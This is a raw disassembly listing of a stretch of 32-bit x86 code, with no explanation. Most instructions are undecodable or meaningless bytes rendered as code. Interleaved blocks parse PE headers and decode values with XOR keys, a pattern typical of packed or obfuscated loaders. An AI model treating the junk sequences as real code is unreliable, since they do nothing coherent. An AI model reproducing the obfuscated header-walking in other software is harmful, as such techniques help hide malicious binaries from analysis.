  408c8d:	int    0xa
  408c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c90:	dec    eax
  408c91:	fstp   DWORD PTR [esi+0xd]
  408c94:	xchg   ebp,eax
  408c95:	fsub   DWORD PTR [ebp+esi*1+0x48]
  408c99:	sar    DWORD PTR [esi],0xcd
  408c9c:	add    BYTE PTR [edx],ch
  408c9e:	jnp    0x408ce1
  408ca0:	test   al,dh
  408ca2:	add    BYTE PTR [edi],dl
  408ca4:	jp     0x408c85
  408ca6:	mov    ebx,0x48c3675d
  408cab:	mov    al,ds:0x62068543
  408cb0:	je     0x408cb7
  408cb2:	jecxz  0x408cfd
  408cb4:	adc    BYTE PTR [ebp-0x7e],ah
  408cb7:	mov    ds:0x20403aad,eax
  408cbc:	add    ecx,DWORD PTR [edi]
  408cbe:	sbb    DWORD PTR [ebp-0x62],ebp
  408cc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cc2:	cmp    BYTE PTR [esi+0x27fc8681],bl
  408cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cc9:	adc    DWORD PTR [ebx],ebp
  408ccb:	xchg   ebx,eax
  408ccc:	mov    esi,0x24767125
  408cd1:	inc    edi
  408cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cd3:	jbe    0x408c6e
  408cd5:	aad    0xdb
  408cd7:	cmc    
  408cd8:	push   esp
  408cd9:	inc    ebp
  408cda:	push   ebp
  408cdb:	adc    ebx,DWORD PTR [ebx+ebx*1]
  408cde:	aaa    
  408cdf:	or     eax,edx
  408ce1:	mov    ecx,0xb63f63e7
  408ce6:	mov    fs:0xdd2a06f6,al
  408cec:	jl     0x408c96
  408cee:	rcl    DWORD PTR [ecx],cl
  408cf0:	xor    dh,BYTE PTR [eax+edi*8-0x3c23516d]
  408cf7:	add    al,0xfc
  408cf9:	sbb    al,BYTE PTR [ebp-0x7c]
  408cfc:	push   ebx
  408cfd:	mov    ecx,0xdb884926
  408d02:	xchg   BYTE PTR [edx-0x28],ah
  408d05:	or     edi,DWORD PTR [ebp+0x368092a9]
  408d0b:	aam    0x5
  408d0d:	dec    esi
  408d0e:	fwait
  408d0f:	xchg   al,al
  408d11:	fsub   DWORD PTR [ebp-0x1674406f]
  408d17:	pop    edx
  408d18:	cmc    
  408d19:	xor    eax,0xa2a8fb5d
  408d1e:	js     0x408ca5
  408d20:	jne    0x408d33
  408d22:	cdq    
  408d23:	retf   
  408d24:	ins    DWORD PTR es:[edi],dx
  408d25:	adc    BYTE PTR [ebx],dl
  408d27:	mov    dl,0x4d
  408d29:	push   ebx
  408d2a:	aaa    
  408d2b:	sahf   
  408d2c:	imul   ebx,DWORD PTR [eax],0x35
  408d2f:	lea    ebx,[esi]
  408d31:	inc    esp
  408d32:	fidiv  WORD PTR [esi]
  408d34:	add    al,0x94
  408d36:	popf   
  408d37:	pop    esi
  408d38:	lea    edx,[eax]
  408d3a:	das    
  408d3b:	mov    esp,0xa62aaf1e
  408d40:	mov    ebp,ebp
  408d42:	mov    ch,0xa5
  408d44:	(bad)  
  408d45:	jg     0x408d1a
  408d47:	aad    0x7
  408d49:	je     0x408cf0
  408d4b:	sub    cl,BYTE PTR [ebx-0x76]
  408d4e:	dec    esp
  408d4f:	cli    
  408d50:	and    esi,DWORD PTR ds:0x938038c9
  408d56:	rol    edx,1
  408d58:	bnd jge 0x408d68
  408d5b:	scas   eax,DWORD PTR es:[edi]
  408d5c:	pop    ss
  408d5d:	mov    ds:0x2b3ccd12,al
  408d62:	test   DWORD PTR ds:0x8ac01ba9,eax
  408d68:	imul   edx,DWORD PTR [ebp-0x7e64db5f],0x2aba4c93
  408d72:	push   ss
  408d73:	sub    bh,al
  408d75:	pushf  
  408d76:	lds    ecx,FWORD PTR [edx-0x57]
  408d79:	rcr    BYTE PTR [ecx+0x1c],1
  408d7c:	cmp    dl,BYTE PTR [ebx+0x765133cf]
  408d82:	enter  0xb8af,0x80
  408d86:	xor    edx,DWORD PTR [eax]
  408d88:	out    dx,eax
  408d89:	test   BYTE PTR [ecx+edx*4+0x4b],0x20
  408d8e:	pop    ecx
  408d8f:	add    DWORD PTR [edi+eiz*1-0x3a],esp
  408d93:	cmovl  edi,DWORD PTR [eax+0x688c7b56]
  408d9a:	in     eax,0x70
  408d9c:	jbe    0x408d35
  408d9e:	repnz and eax,0x7e91564b
  408da4:	loop   0x408d4a
  408da6:	mov    BYTE PTR [esi-0x7557f0b1],al
  408dac:	sti    
  408dad:	outs   dx,DWORD PTR ds:[esi]
  408dae:	(bad)  
  408daf:	jg     0x408d77
  408db1:	inc    esi
  408db2:	(bad)
  408db5:	pop    eax
  408db6:	pusha  
  408db7:	jle    0x408d9f
  408db9:	add    esp,eax
  408dbb:	pop    ebx
  408dbc:	loope  0x408e34
  408dbe:	test   ebp,edx
  408dc0:	iret   
  408dc1:	pop    esi
  408dc2:	les    esp,FWORD PTR [eax-0x78bb569c]
  408dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dc9:	popa   
  408dca:	push   ds
  408dcb:	cmp    bl,al
  408dcd:	xchg   ebp,eax
  408dce:	cs sbb eax,0x929a5a8b
  408dd4:	dec    esi
  408dd5:	addr16 ja 0x408e4c
  408dd8:	(bad)  
  408dd9:	fbstp  TBYTE PTR [eax*4+0x261bedff]
  408de0:	jecxz  0x408e0c
  408de2:	shl    DWORD PTR [eax+0x23],cl
  408de5:	xchg   ebp,eax
  408de6:	xchg   esp,eax
  408de7:	aad    0x7f
  408de9:	mov    ebp,0xeb0a81c9
  408dee:	loopne 0x408deb
  408df0:	les    edx,FWORD PTR [eax+0x71e3f4ac]
  408df6:	pop    ss
  408df7:	ror    DWORD PTR [edi+0x73],1
  408dfa:	fxch   st(5)
  408dfc:	(bad)  
  408dfd:	or     edx,ebp
  408dff:	sbb    DWORD PTR [ebx+0x25],ebp
  408e02:	sti    
  408e03:	or     al,0xf4
  408e05:	mov    WORD PTR [esi-0x74],?
  408e08:	mov    WORD PTR [esi],es
  408e0a:	scas   al,BYTE PTR es:[edi]
  408e0b:	cmp    al,0xa7
  408e0d:	(bad)  
  408e0e:	ret    0x9c4b
  408e11:	push   0x288fa32
  408e16:	test   al,0x52
  408e18:	inc    ecx
  408e19:	pop    edx
  408e1a:	mov    bl,0x9d
  408e1c:	in     eax,dx
  408e1d:	inc    esp
  408e1e:	fistp  DWORD PTR ds:0x10f83555
  408e24:	cdq    
  408e25:	and    al,0x66
  408e27:	mov    eax,DWORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x4cdfb421
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	call   0xdb38b4f5
  408ec9:	mov    ebp,DWORD PTR [edx-0x2a]
  408ecc:	mov    esp,0xc4699dac
  408ed1:	call   0xdaebdbd3
  408ed6:	in     eax,dx
  408ed7:	sbb    DWORD PTR ds:[esp+eax*2-0x72d69953],eax
  408edf:	(bad)  
  408ee0:	aas    
  408ee1:	out    dx,eax
  408ee2:	imul   eax,DWORD PTR [edi+0x1eee796d],0x2a91b7fa
  408eec:	and    al,0x63
  408eee:	inc    eax
  408eef:	dec    ecx
  408ef0:	std    
  408ef1:	mov    dl,0x39
  408ef3:	mov    ah,0x40
  408ef5:	mov    ch,0xc
  408ef7:	shr    BYTE PTR [ebx],cl
  408ef9:	pushf  
  408efa:	mov    bl,0x29
  408efc:	repnz outs dx,DWORD PTR ds:[esi]
  408efe:	adc    DWORD PTR [esi+0x5e],ebx
  408f01:	dec    esi
  408f02:	xor    DWORD PTR [edx-0xee03a7],edx
  408f08:	xchg   ebp,eax
  408f09:	xchg   esp,eax
  408f0a:	aam    0x8
  408f0c:	(bad)  
  408f0d:	add    ch,ah
  408f0f:	ret    
  408f10:	ds mov dh,0x4f
  408f13:	(bad)  
  408f14:	js     0x408f3b
  408f16:	call   0x6328:0xfb039a9b
  408f1d:	aad    0x84
  408f1f:	ja     0x408f11
  408f21:	pop    ebx
  408f22:	sar    DWORD PTR ds:0x9b06b5c2,cl
  408f28:	inc    esi
  408f29:	leave  
  408f2a:	nop
  408f2b:	inc    ecx
  408f2c:	scas   al,BYTE PTR es:[edi]
  408f2d:	(bad)  
  408f2e:	fdivr  QWORD PTR [ebx]
  408f30:	aaa    
  408f31:	bound  ebp,QWORD PTR [edi+edx*1-0x76]
  408f35:	pop    ss
  408f36:	loopne 0x408f90
  408f38:	test   eax,0x2f04c88d
  408f3d:	jbe    0x408f4f
  408f3f:	cmp    BYTE PTR [edi+ecx*4-0x5192d304],bh
  408f46:	das    
  408f47:	xor    ah,bl
  408f49:	fstp   QWORD PTR [edx+0x5]
  408f4c:	pop    ds
  408f4d:	mov    eax,0x1366c1c4
  408f52:	dec    eax
  408f53:	jmp    FWORD PTR [edx+0x2bd4f3e3]
  408f59:	data16 sub al,0x76
  408f5c:	pop    esp
  408f5d:	lods   al,BYTE PTR ds:[esi]
  408f5e:	sbb    esp,DWORD PTR [esi]
  408f60:	jbe    0x408f96
  408f62:	xor    ebx,esi
  408f64:	xchg   ebp,eax
  408f65:	mov    ds:0xb013fa90,eax
  408f6a:	test   al,0xc2
  408f6c:	popa   
  408f6d:	adc    BYTE PTR [esi+eiz*8-0x3c],al
  408f71:	cmp    eax,0x1b8008a9
  408f76:	cmp    eax,0xa90ea99c
  408f7b:	jbe    0x408f43
  408f7d:	jno    0x408ffc
  408f7f:	adc    DWORD PTR [esp+eax*2],ebx
  408f82:	mov    bh,bh
  408f84:	mov    ds:0xe2ec0a73,eax
  408f89:	ret    
  408f8a:	dec    edx
  408f8b:	fldenv [esi+0x36]
  408f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f8f:	fcomp  st(4)
  408f91:	sar    DWORD PTR [edi+0x13],cl
  408f94:	shl    BYTE PTR [ecx+0x31],1
  408f97:	dec    ebx
  408f98:	repnz push ss
  408f9a:	aad    0xf4
  408f9c:	sbb    al,BYTE PTR [edx-0x1a]
  408f9f:	repnz adc eax,0xfc2f02fd
  408fa5:	adc    eax,0x2604ea8f
  408faa:	jecxz  0x408f90
  408fac:	dec    edx
  408fad:	mov    al,ds:0xf188f715
  408fb2:	ficom  WORD PTR [ebx]
  408fb4:	sub    edi,DWORD PTR [ecx]
  408fb6:	sub    al,0x99
  408fb8:	inc    edi
  408fb9:	mov    eax,0x8c0f0bf0
  408fbe:	add    eax,0x75f3c091
  408fc3:	fs add eax,0xab258379
  408fc9:	xor    dl,0xd5
  408fcc:	xchg   ecx,eax
  408fcd:	scas   eax,DWORD PTR es:[edi]
  408fce:	popa   
  408fcf:	pop    es
  408fd0:	popf   
  408fd1:	ds (bad) 
  408fd3:	pop    esp
  408fd4:	(bad)  
  408fd5:	cmp    ebx,eax
  408fd7:	lods   al,BYTE PTR ds:[esi]
  408fd8:	adc    BYTE PTR [edi-0x6475dacf],dl
  408fde:	in     eax,dx
  408fdf:	cmp    ah,BYTE PTR [eax]
  408fe1:	mov    al,0x47
  408fe3:	mov    ebx,ebx
  408fe5:	jne    0x408fcd
  408fe7:	leave  
  408fe8:	arpl   WORD PTR [esi],cx
  408fea:	jge    0x408fd4
  408fec:	and    DWORD PTR [si-0x1fe6],edx
  408ff1:	sbb    al,dl
  408ff3:	pop    ebx
  408ff4:	out    dx,eax
  408ff5:	addr16 push esp
  408ff7:	retf   
  408ff8:	inc    ecx
  408ff9:	fs inc esp
  408ffb:	adc    DWORD PTR [ebp-0x1a],edx
  408ffe:	lds    eax,FWORD PTR [edi+eiz*1+0x6f]
  409002:	add    eax,0xf6561bee
  409007:	popf   
  409008:	mov    ebx,0xea29bd9c
  40900d:	es mov ah,0x3
  409010:	mov    ebp,0x27d5c802
  409015:	push   esp
  409016:	es call 0x12d0:0xaf31e467
  40901e:	lock push ecx
  409020:	mov    ch,BYTE PTR [ecx+0x7ef9a460]
  409026:	cmc    
  409027:	jp     0x408fd8
  409029:	in     eax,0xa8
  40902b:	pop    esi
  40902c:	sub    esp,DWORD PTR [edi-0x7a02241c]
  409032:	fild   WORD PTR ds:0xaa0c39c
  409038:	jp     0x409016
  40903a:	cmp    edi,DWORD PTR [eax-0x58]
  40903d:	dec    ecx
  40903e:	push   esp
  40903f:	cwde   
  409040:	fistp  DWORD PTR [eax]
  409042:	pop    eax
  409043:	bound  ebx,QWORD PTR [ebx]
  409045:	mov    ch,0x2a
  409047:	call   0x358f5ac0
  40904c:	mov    edx,0x5c8103ad
  409051:	inc    ecx
  409052:	jb     0x408fdd
  409054:	iret   
  409055:	iret   
  409056:	push   ebp
  409057:	cmp    al,0x40
  409059:	xchg   ebp,eax
  40905a:	mov    fs,edi
  40905c:	push   esp
  40905d:	nop
  40905e:	cmc    
  40905f:	push   ebx
  409060:	and    BYTE PTR [eax-0xc],dh
  409063:	pusha  
  409064:	aas    
  409065:	test   eax,0xa8bd5def
  40906a:	and    al,0xf2
  40906c:	push   ebx
  40906d:	sbb    eax,DWORD PTR [eax-0x5e5fbc89]
  409073:	push   ebx
  409074:	out    0xf2,al
  409076:	repnz cmovg eax,ebx
  40907a:	pop    ebx
  40907b:	add    eax,0x5f695f95
  409080:	cmp    BYTE PTR [ebp+0x25],bl
  409083:	test   BYTE PTR [esi-0x31],ch
  409086:	iret   
  409087:	call   0x1e31:0xbdc79d0
  40908e:	xor    BYTE PTR [ebp+0x5c3a4051],dl
  409094:	pop    ebp
  409095:	adc    DWORD PTR [esi],0xd541142b
  40909b:	lds    ecx,FWORD PTR [edi+edx*4-0x7]
  40909f:	ds inc ecx
  4090a1:	and    esi,DWORD PTR [ecx+0x2a10fa3b]
  4090a7:	pop    DWORD PTR [ecx+ebp*2-0x412794c0]
  4090ae:	ja     0x4090ca
  4090b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090b1:	add    al,0xe5
  4090b3:	push   ebp
  4090b4:	add    al,0xfe
  4090b6:	mov    ah,0x82
  4090b8:	cmp    ecx,0x2abe665d
  4090be:	push   ecx
  4090bf:	aaa    
  4090c0:	fmul   DWORD PTR [edi]
  4090c2:	xchg   esp,eax
  4090c3:	int3   
  4090c4:	inc    eax
  4090c5:	stos   BYTE PTR es:[edi],al
  4090c6:	xchg   esp,eax
  4090c7:	jne    0x409061
  4090c9:	push   ds
  4090ca:	mov    eax,0xccddd2e
  4090cf:	xchg   esp,eax
  4090d0:	es jno 0x4090cc
  4090d3:	test   BYTE PTR [ebp-0x37adba70],al
  4090d9:	mov    BYTE PTR [edx+0x7f7a2c88],cl
  4090df:	sub    al,0x14
  4090e1:	push   0xffffffb0
  4090e3:	mov    DWORD PTR [ebx-0xe],edx
  4090e6:	bnd jne 0x4090e0
  4090e9:	mov    bh,0x6e
  4090eb:	or     DWORD PTR [edx+0x31],edx
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xb3
  409163:	out    0x76,al
  409165:	jg     0x409199
  409167:	fistp  QWORD PTR [esi+0x7e]
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	dec    eax
  40916f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409170:	adc    BYTE PTR [ebp-0x11174d9b],cl
  409176:	clc    
  409177:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  409179:	cmp    dl,BYTE PTR [eax+ebp*8]
  40917c:	sbb    DWORD PTR [edi],eax
  40917e:	pushf  
  40917f:	mov    BYTE PTR [esi+0x7f],al
  409182:	in     eax,0xde
  409184:	pop    edi
  409185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409186:	scas   eax,DWORD PTR es:[edi]
  409187:	cmp    bl,al
  409189:	jmp    0xd61a9c
  40918e:	shr    BYTE PTR [esi],1
  409190:	inc    edx
  409191:	add    ch,dl
  409193:	and    DWORD PTR [edi],ebp
  409195:	pop    esi
  409196:	into   
  409197:	loop   0x4091f8
  409199:	loop   0x4091ed
  40919b:	stos   DWORD PTR es:[edi],eax
  40919c:	inc    eax
  40919d:	fldl2t 
  40919f:	add    BYTE PTR [esi],bh
  4091a1:	push   ebx
  4091a2:	sub    DWORD PTR [ecx],ebp
  4091a4:	dec    edx
  4091a5:	retf   0xbc2c
  4091a8:	out    0xc8,al
  4091aa:	ins    DWORD PTR es:[edi],dx
  4091ab:	and    al,0x8f
  4091ad:	inc    ebp
  4091ae:	pop    eax
  4091af:	daa    
  4091b0:	es push edx
  4091b2:	mov    esi,0x411b946b
  4091b7:	or     esp,esi
  4091b9:	gs pop edi
  4091bb:	rcr    BYTE PTR [eax],cl
  4091bd:	out    dx,al
  4091be:	lock push cs
  4091c0:	retf   
  4091c1:	jnp    0x4091b2
  4091c3:	hlt    
  4091c4:	ret    0x9de
  4091c7:	mov    edx,0x52a4fad
  4091cc:	das    
  4091cd:	in     al,0x7b
  4091cf:	mov    eax,ds:0xdaf84bb7
  4091d4:	cmc    
  4091d5:	jmp    0x80c4dd4f
  4091da:	fwait
  4091db:	xor    ecx,DWORD PTR [edx+0x2b]
  4091de:	dec    ecx
  4091df:	inc    esi
  4091e0:	dec    ebx
  4091e1:	xchg   edx,eax
  4091e2:	mov    dl,0x28
  4091e4:	pop    edi
  4091e5:	mov    ecx,0x33e3b117
  4091ea:	bound  esi,QWORD PTR [ebp+0x15]
  4091ed:	mov    esp,0x28102379
  4091f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091f3:	fs mov edx,0xa8fb8c42
  4091f9:	int    0x27
  4091fb:	(bad)  
  4091fc:	std    
  4091fd:	les    esp,FWORD PTR [edi-0x25]
  409200:	nop
  409201:	fisubr DWORD PTR [ebx]
  409203:	mov    edi,0x7c7dc88e
  409208:	pushf  
  409209:	test   eax,0x2ae34643
  40920e:	jle    0x409283
  409210:	mov    ebx,0x7d122e27
  409215:	jns    0x409293
  409217:	rcl    DWORD PTR [ebx],0xbc
  40921a:	ret    0x86af
  40921d:	(bad)  
  40921e:	ins    DWORD PTR es:[edi],dx
  40921f:	cmp    eax,0x1bf9bb8
  409224:	jmp    0x27a1:0xbcad74f0
  40922b:	xor    BYTE PTR [ecx+0x4a],cl
  40922e:	and    edi,DWORD PTR [ebx+0xf]
  409231:	in     al,0x2
  409233:	push   eax
  409234:	fldenv [eax-0x64d1e3c]
  40923a:	sar    DWORD PTR [esi-0x41],cl
  40923d:	jb     0x40928f
  40923f:	xlat   BYTE PTR ds:[ebx]
  409240:	(bad)  
  409241:	jns    0x40922f
  409243:	dec    edi
  409244:	mov    edx,0x3b8ba0ba
  409249:	xchg   ecx,eax
  40924a:	xchg   BYTE PTR [ebx-0x2f],ah
  40924d:	pop    edx
  40924e:	mov    ds:0xefe9c28,al
  409253:	sbb    BYTE PTR [eax],dl
  409255:	addr16 je 0x409257
  409258:	inc    edx
  409259:	out    dx,al
  40925a:	rol    BYTE PTR ds:0x98780946,cl
  409260:	out    dx,al
  409261:	mov    bl,0x5d
  409263:	loopne 0x409236
  409265:	in     eax,0xb4
  409267:	jecxz  0x409283
  409269:	js     0x4092e0
  40926b:	jl     0x40924c
  40926d:	js     0x409287
  40926f:	push   0xffffffe6
  409271:	ror    DWORD PTR [ecx+0x4631e1e0],1
  409277:	mov    esi,0xf847a011
  40927c:	inc    edx
  40927d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40927e:	add    BYTE PTR [ebp+0x470baeb9],ch
  409284:	es jo  0x4092bf
  409287:	lds    eax,FWORD PTR [edx-0x23dea87c]
  40928d:	add    DWORD PTR [eax+0x575527d3],ecx
  409293:	xor    eax,0x71916c6f
  409298:	cmp    cl,dh
  40929a:	in     al,dx
  40929b:	imul   edx,DWORD PTR [edx-0x121b3b],0xcf99e810
  4092a5:	dec    edi
  4092a6:	popf   
  4092a7:	pop    edi
  4092a8:	mov    ebp,0x6ba477ee
  4092ad:	xlat   BYTE PTR ds:[ebx]
  4092ae:	lock sub DWORD PTR [esi+0x3],0xffffffa8
  4092b3:	es aaa 
  4092b5:	pop    ebx
  4092b6:	stc    
  4092b7:	push   edi
  4092b8:	and    esi,esi
  4092ba:	lods   eax,DWORD PTR ds:[esi]
  4092bb:	shl    DWORD PTR [esi],1
  4092bd:	push   ss
  4092be:	pop    edx
  4092bf:	fisubr DWORD PTR [edi]
  4092c1:	and    DWORD PTR [eax+eax*2+0x35],esp
  4092c5:	sbb    al,0xd1
  4092c7:	push   esi
  4092c8:	in     al,dx
  4092c9:	loop   0x4092f1
  4092cb:	sbb    bl,ah
  4092cd:	xor    DWORD PTR [edx+0x7c2c4138],ebp
  4092d3:	(bad)
  4092d6:	mov    esp,eax
  4092d8:	dec    ecx
  4092d9:	leave  
  4092da:	mov    ecx,0x9e1d092
  4092df:	in     eax,dx
  4092e0:	sub    ah,BYTE PTR ds:0x4239af4e
  4092e6:	cwde   
  4092e7:	pop    ss
  4092e8:	stos   BYTE PTR es:[edi],al
  4092e9:	adc    ah,BYTE PTR [esi]
  4092eb:	xor    BYTE PTR [edi+0x77],dl
  4092ee:	jae    0x409345
  4092f0:	sti    
  4092f1:	loop   0x40934b
  4092f3:	mov    ebx,0xcc590159
  4092f8:	xchg   ebp,eax
  4092f9:	mov    ah,0xd2
  4092fb:	xchg   edi,eax
  4092fc:	in     eax,0x13
  4092fe:	xchg   ecx,eax
  4092ff:	xor    eax,eax
  409301:	ss mov dh,al
  409304:	(bad)  
  409306:	adc    edx,esp
  409308:	push   ds
  409309:	inc    esi
  40930a:	xor    WORD PTR ds:[ecx],cx
  40930e:	arpl   WORD PTR [edx*8+0x2aaf525e],ax
  409315:	xor    DWORD PTR [edi-0x1a],esp
  409318:	dec    edi
  409319:	pop    edx
  40931a:	xor    bl,bl
  40931c:	pop    edx
  40931d:	push   esi
  40931e:	or     eax,0x740e5da6
  409323:	enter  0x33ee,0x4c
  409327:	scas   eax,DWORD PTR es:[edi]
  409328:	push   ecx
  409329:	arpl   WORD PTR [esi+0x3f],dx
  40932c:	stos   DWORD PTR es:[edi],eax
  40932d:	jl     0x4092c2
  40932f:	dec    edi
  409330:	pop    esp
  409331:	or     al,0x94
  409333:	mov    dl,0x2f
  409335:	adc    bl,BYTE PTR [edx]
  409337:	loope  0x4092dd
  409339:	dec    ebp
  40933a:	enter  0x9953,0x62
  40933e:	push   edi
  40933f:	scas   al,BYTE PTR es:[edi]
  409340:	stc    
  409341:	jne    0x4093b3
  409343:	pop    edi
  409344:	repnz mov ds:0xe660e4ba,al
  40934a:	lds    ebp,FWORD PTR [edi+0x30b09b73]
  409350:	mov    al,ds:0x91996162
  409355:	mov    ch,0x9d
  409357:	jmp    0x4092f9
  409359:	dec    edx
  40935a:	mov    esi,0xc8342aae
  40935f:	pushf  
  409360:	jno    0x40932c
  409362:	fild   QWORD PTR [eax+0x29fdccc1]
  409368:	mov    dl,0x53
  40936a:	and    al,0x38
  40936c:	frstor [ebp-0x3b100cc8]
  409372:	jp     0x409388
  409374:	popf   
  409375:	mov    cs,WORD PTR [edx+0x79cdad8d]
  40937b:	lsl    esi,WORD PTR [eax+0x5]
  40937f:	iret   
  409380:	lea    edx,[esi]
  409382:	adc    esp,DWORD PTR [ecx+0x4ffb9ba2]
  409388:	das    
  409389:	je     0x409390
  40938b:	mov    al,ds:0x5a8b50a9
  409390:	mov    ebx,0x48cfadb9
  409395:	cli    
  409396:	adc    DWORD PTR [ecx-0x77],ecx
  409399:	or     BYTE PTR [ebx+0x458b0c45],cl
  40939f:	or     bh,bh
  4093a1:	jne    0x40939b
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	fs jle 0x4093a2
  4093b7:	pop    ss
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	inc    esp
  4093c1:	sub    al,0xfc
  4093c3:	repz pushf 
  4093c5:	dec    edi
  4093c6:	lea    edi,[ebx-0x6f]
  4093c9:	jns    0x40940d
  4093cb:	mov    dh,0xb9
  4093cd:	out    dx,al
  4093ce:	xchg   ebp,eax
  4093cf:	xchg   ecx,eax
  4093d0:	dec    esp
  4093d1:	imul   eax,DWORD PTR [esi+edx*8],0x2f
  4093d5:	cld    
  4093d6:	loope  0x4093df
  4093d8:	pop    esi
  4093d9:	xchg   esi,eax
  4093da:	and    DWORD PTR [edi],ebp
  4093dc:	cdq    
  4093dd:	in     eax,0xf6
  4093df:	lock les edi,FWORD PTR [edi-0x55]
  4093e3:	xchg   DWORD PTR [ebx-0x2b],ecx
  4093e6:	mov    ah,0xcb
  4093e8:	mov    esp,DWORD PTR [esi]
  4093ea:	push   ss
  4093eb:	retf   
  4093ec:	das    
  4093ed:	out    dx,eax
  4093ee:	daa    
  4093ef:	lea    ebp,[esi]
  4093f1:	pop    es
  4093f2:	jnp    0x409377
  4093f4:	repz add eax,0x591bbb2d
  4093fa:	out    dx,al
  4093fb:	ds scas al,BYTE PTR es:[edi]
  4093fd:	aaa    
  4093fe:	ret    0x652d
  409401:	fs mov ebp,0xed04c6ea
  409407:	mov    eax,ds:0xe85129db
  40940c:	lea    ebp,[eax+ecx*1-0x54252f18]
  409413:	test   DWORD PTR [eax+0xaf6459c],esp
  409419:	inc    ebp
  40941a:	mov    BYTE PTR [edi],ah
  40941c:	aas    
  40941d:	fdiv   DWORD PTR [ecx-0xca4299d]
  409423:	sbb    cl,BYTE PTR fs:[esi+0x514ad0a]
  40942a:	add    DWORD PTR [edi-0x50],0xffffff87
  40942e:	mov    esp,0xa6c167fa
  409433:	push   ss
  409434:	test   BYTE PTR [esi],ah
  409436:	mov    esi,0xa5359e11
  40943b:	mov    ecx,edi
  40943d:	adc    eax,0x58a5ed99
  409442:	hlt    
  409443:	mov    ebp,0xd9c936ff
  409448:	pop    ebx
  409449:	xchg   DWORD PTR [ebx],edx
  40944b:	and    ebx,edi
  40944d:	pop    ebp
  40944e:	pop    ds
  40944f:	jp     0x4094ae
